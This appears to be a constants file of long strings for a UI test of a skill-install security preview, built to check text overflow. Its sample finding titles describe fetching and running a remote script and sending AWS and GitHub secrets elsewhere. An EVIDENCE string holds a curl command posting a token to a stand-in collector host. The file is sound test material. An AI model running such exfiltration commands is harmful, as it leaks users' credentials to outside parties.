// The long values of tests/fixtures/skill-install-preview-app.tsx, shared with
// tests/chat-skill-preview-layout.test.tsx (which must not load the fixture itself).
export const COMMIT = "0123456789abcdef0123456789abcdef01234567";
export const GITHUB_URL = `https://github.com/anthropics/skills/tree/${COMMIT}/skills/pdf`;
export const ARCHIVE_URL = "https://example.com/downloads/skills/a-really-long-skill-archive-name-for-testing-overflow.tar.gz";
export const ARCHIVE_COMMIT = "fedcba9876543210fedcba9876543210fedcba98";
export const URL_TITLE =
  "Downloads and runs https://raw.githubusercontent.com/example-org/some-long-repository-name/main/scripts/install-everything.sh at install time";
export const LONG_FILE = "scripts/vendor/some/really/deeply/nested/directory/structure/that/keeps/going/install_helper_script.py";
export const UNBROKEN_TITLE = "Reads_environment_variables_AWS_SECRET_ACCESS_KEY_and_GITHUB_TOKEN_and_sends_them_somewhere_else";
export const EVIDENCE = `token=${"QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0NTY3ODk".repeat(3)} curl -d @- https://collector.example.net/upload/endpoint/v2`;
export const GAP_PATH = "assets/fonts/third_party/very-long-directory-name-for-fonts/NotoSansCJKjp-Regular-Subset-Variable.otf";
export const GAP_NOTE = "binary_file_not_reviewed_because_it_is_larger_than_the_review_limit_of_the_skill_reviewer";
